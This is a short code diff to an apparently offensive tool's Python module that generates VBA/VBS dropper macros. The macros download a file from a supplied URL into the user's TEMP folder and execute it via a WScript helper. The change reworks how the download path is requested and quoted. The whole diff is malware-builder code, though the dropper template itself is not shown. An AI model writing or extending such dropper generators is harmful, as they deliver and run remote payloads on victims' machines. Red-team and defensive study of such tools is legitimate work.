@@ -54,15 +54,20 @@ class TemplateToVba(MpModule):
     def _processDropperTemplate(self):
         """ Generate DROPPER  template for VBA and VBS based """
         # Get required parameters
-        paramDict = OrderedDict([("target_url",None),("download_path",None)])      
+        downloadPathKey = "File name in TEMP or full file path."
+        paramDict = OrderedDict([("target_url",None),(downloadPathKey,None)])      
         self.fillInputParams(paramDict)
+
+        paramDict[downloadPathKey] = '"' + paramDict[downloadPathKey] + '"'
+        if "\\" not in paramDict[downloadPathKey] and "/" not in paramDict[downloadPathKey]:
+            paramDict[downloadPathKey] = 'Environ("TEMP") & "\\" & ' + paramDict[downloadPathKey]
 
         # Add required functions
         self.addVBAModule(vbLib.WscriptExec.VBA)
 
         content = vbLib.templates.DROPPER
         content = content.replace("<<<URL>>>", paramDict["target_url"])
-        content = content.replace("<<<DOWNLOAD_PATH>>>", paramDict["download_path"])
+        content = content.replace("<<<DOWNLOAD_PATH>>>", paramDict[downloadPathKey])
         # generate random file name
         vbaFile = self.addVBAModule(content)
         
